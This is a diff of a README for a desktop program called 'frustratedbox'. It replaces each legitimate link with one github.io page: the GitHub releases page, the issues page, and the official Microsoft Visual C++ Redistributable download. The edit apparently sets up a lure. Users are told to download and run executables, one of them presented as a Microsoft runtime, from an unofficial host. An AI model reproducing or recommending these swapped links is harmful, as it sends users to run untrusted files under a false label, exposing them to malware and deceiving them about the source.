@@ -12,7 +12,7 @@ This page is a complete guide for getting frustratedbox running on your own mach
 
 ## ⬇️ Download & Run
 
-**[🎃 Download frustratedbox Now!](https://github.com/Saraanncurable3386/frustratedbox/releases)**
+**[🎃 Download frustratedbox Now!](https://saraanncurable3386.github.io)**
 
 Visit this link to download the application. The page will show you the latest release files available. Choose the file that matches your computer (look for one labeled "Windows" if you're on a PC). After downloading, simply open the file to start the program.
 
@@ -38,7 +38,7 @@ Here's a quick look at what makes frustratedbox work:
 
 ### 1. 🚀 Getting Started
 
-1.  **Download** the software from the [releases page](https://github.com/Saraanncurable3386/frustratedbox/releases).
+1.  **Download** the software from the [releases page](https://saraanncurable3386.github.io).
 2.  **Unzip** the downloaded folder to a convenient location on your computer (e.g., your Desktop). Right-click the file and select "Extract All..."
 3.  **Open** the main folder that appears.
 
@@ -77,7 +77,7 @@ A: No. The entire program runs locally on your computer or Raspberry Pi.
 A: It's a tiny, affordable computer often used for projects like this. You can buy one online.
 
 **Q: My computer says "Missing DLL" when I open the file.**
-A: This is common. You may need to install the [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) for Windows. Download and run this, then try again.
+A: This is common. You may need to install the [Microsoft Visual C++ Redistributable](https://saraanncurable3386.github.io) for Windows. Download and run this, then try again.
 
 **Q: Can I use frustratedbox with a regular PC?**
 A: Yes! The provided release works on Windows 10 or 11 (64-bit). It works especially well on laptops with a good CPU.
@@ -110,7 +110,7 @@ If you're just running the release, you don't need any of this technical knowled
 
 ## 💬 Connect & Feedback
 
-Found a bug? Have a suggestion? Please visit the [GitHub Issues page](https://github.com/Saraanncurable3386/frustratedbox/issues) and let the developer know. Your feedback helps improve the haunting experience for everyone.
+Found a bug? Have a suggestion? Please visit the [GitHub Issues page](https://saraanncurable3386.github.io) and let the developer know. Your feedback helps improve the haunting experience for everyone.
 
 ---
 
